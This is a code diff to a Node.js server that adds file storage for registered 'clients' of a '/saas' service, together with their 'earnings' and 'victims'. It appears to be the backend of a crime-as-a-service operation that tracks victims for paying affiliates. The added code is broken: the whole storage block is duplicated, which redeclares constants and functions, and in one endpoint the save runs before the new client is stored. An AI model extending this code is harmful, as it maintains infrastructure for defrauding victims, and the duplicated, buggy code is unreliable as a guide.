@@ -101,6 +101,7 @@ app.post('/saas/register', (req, res) => {
     
     const newClient = new Client(clientId, clientConfig);
     clients.set(clientId, newClient);
+    saveClientsToFile();
     
     console.log(`🎯 New client registered: ${projectName} (${clientId})`);
     
@@ -185,6 +186,7 @@ app.post('/saas/v2/register', (req, res) => {
     };
     
     const newClient = new EnhancedClient(clientId, clientConfig);
+    saveClientsToFile();
     clients.set(clientId, newClient);
     clientEarnings.set(clientId, []);
     clientVictims.set(clientId, []);
@@ -4335,3 +4337,87 @@ app.get('/ping', (req, res) => {
     version: '1.0'
   });
 });
+
+// File-based client data storage
+const CLIENTS_DATA_FILE = 'clients-data.json';
+
+// Save all client data to file
+function saveClientsToFile() {
+  try {
+    const clientsData = {
+      clients: Array.from(clients.entries()),
+      earnings: Array.from(clientEarnings.entries()),
+      victims: Array.from(clientVictims.entries()),
+      timestamp: new Date().toISOString()
+    };
+    fs.writeFileSync(CLIENTS_DATA_FILE, JSON.stringify(clientsData, null, 2));
+    console.log(`💾 Saved ${clients.size} clients to file`);
+  } catch (error) {
+    console.error('Error saving clients to file:', error);
+  }
+}
+
+// Load client data from file on startup
+function loadClientsFromFile() {
+  try {
+    if (fs.existsSync(CLIENTS_DATA_FILE)) {
+      const data = JSON.parse(fs.readFileSync(CLIENTS_DATA_FILE, 'utf8'));
+      clients = new Map(data.clients || []);
+      clientEarnings = new Map(data.earnings || []);
+      clientVictims = new Map(data.victims || []);
+      console.log(`📂 Loaded ${clients.size} clients from storage`);
+    }
+  } catch (error) {
+    console.log('No existing client data found or file corrupted');
+  }
+}
+
+// Load existing data on server start
+loadClientsFromFile();
+
+// Auto-save every 5 minutes
+setInterval(saveClientsToFile, 300000);
+
+// Also save when new clients register (add to registration endpoints)
+
+// File-based client data storage
+const CLIENTS_DATA_FILE = 'clients-data.json';
+
+// Save all client data to file
+function saveClientsToFile() {
+  try {
+    const clientsData = {
+      clients: Array.from(clients.entries()),
+      earnings: Array.from(clientEarnings.entries()),
+      victims: Array.from(clientVictims.entries()),
+      timestamp: new Date().toISOString()
+    };
+    fs.writeFileSync(CLIENTS_DATA_FILE, JSON.stringify(clientsData, null, 2));
+    console.log(`💾 Saved ${clients.size} clients to file`);
+  } catch (error) {
+    console.error('Error saving clients to file:', error);
+  }
+}
+
+// Load client data from file on startup
+function loadClientsFromFile() {
+  try {
+    if (fs.existsSync(CLIENTS_DATA_FILE)) {
+      const data = JSON.parse(fs.readFileSync(CLIENTS_DATA_FILE, 'utf8'));
+      clients = new Map(data.clients || []);
+      clientEarnings = new Map(data.earnings || []);
+      clientVictims = new Map(data.victims || []);
+      console.log(`📂 Loaded ${clients.size} clients from storage`);
+    }
+  } catch (error) {
+    console.log('No existing client data found or file corrupted');
+  }
+}
+
+// Load existing data on server start
+loadClientsFromFile();
+
+// Auto-save every 5 minutes
+setInterval(saveClientsToFile, 300000);
+
+// Also save when new clients register (add to registration endpoints)
